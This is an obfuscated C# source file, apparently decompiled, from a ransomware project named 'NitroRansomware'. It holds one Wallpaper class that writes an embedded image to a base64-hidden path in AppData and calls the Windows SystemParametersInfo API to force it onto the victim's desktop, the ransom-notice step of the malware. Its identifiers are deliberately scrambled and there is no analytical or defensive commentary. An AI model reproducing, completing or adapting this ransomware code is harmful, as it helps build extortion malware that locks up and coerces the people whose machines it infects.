using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using NitroRansomware.Properties;

namespace NitroRansomware;

internal class Wallpaper
{
	private static uint hKqz00Clz2yeEfPelA61難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = 20u;

	private static uint _3mf7dzu3jukncf8FUFMk難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = 1u;

	private static uint cLUYpv9zXK35NH1v4SW0難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = 2u;

	private static string _69BEhLCYHJTgnmoR1Qih難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化;

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SystemParametersInfo")]
	public static extern int _0uG90P94NcbCjmNDJPhd(uint uAction, int uParam, string lpvParam, uint fuWinIni);

	public static void sKsNqnh1TJ4N9eAb22e2()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		_69BEhLCYHJTgnmoR1Qih難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 = folderPath + Encoding.UTF8.GetString(Convert.FromBase64String("XHdhbGxwYXBlci5wbmc="));
		((Image)Resources.jxPBCBxbU8vtA3jx2wXb難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化).Save(_69BEhLCYHJTgnmoR1Qih難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化);
		_0uG90P94NcbCjmNDJPhd(hKqz00Clz2yeEfPelA61難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化, 0, _69BEhLCYHJTgnmoR1Qih難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化, _3mf7dzu3jukncf8FUFMk難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化 | cLUYpv9zXK35NH1v4SW0難読化ＰＲＯＪＥＣＴ_002DＺＥＮ難読化);
	}
}
